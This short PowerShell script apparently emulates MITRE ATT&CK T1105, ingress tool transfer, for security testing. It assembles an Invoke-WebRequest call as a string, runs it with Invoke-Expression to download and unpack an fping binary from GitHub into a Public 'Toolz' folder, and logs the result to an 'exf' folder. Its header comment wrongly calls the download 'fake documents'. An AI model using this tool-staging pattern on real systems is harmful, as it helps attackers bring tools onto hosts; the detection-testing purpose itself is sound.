# Downloads fake documents archive
# Technic ID : T1105
Clear-Host
Write-Output "==============================================================================="
Write-Output "Command and Control : Ingress Tool Transfer (T1105)"
Write-Output "==============================================================================="
#
$DestinationFile = "$env:PUBLIC\Toolz\fping.zip"; 
$DownloadURL = "https://github.com/dexit/fping-windows/releases/download/fping-4-2-win-binary/fping_x64_4.2.zip";
$exf_file = "$env:PUBLIC\exf\fping_down_extract.txt"; 
$CompleteCommand = "Invoke-WebRequest" + " $DownloadURL" + " -outfile " + "$DestinationFile";
Invoke-Expression  "$CompleteCommand";
if ([System.IO.File]::Exists("$DestinationFile")) { 
  Expand-Archive -LiteralPath "$DestinationFile" -DestinationPath "$env:PUBLIC\Toolz" -Force; 
  "The file $DestinationFile has been downloaded and extracted in Toolz Directory !!!" | Out-File -FilePath "$exf_file"; 
  exit 0; 
}
else {
  "The file $DestinationFile does not exists !!!" | Out-File -FilePath "$exf_file";
  exit 1; 
}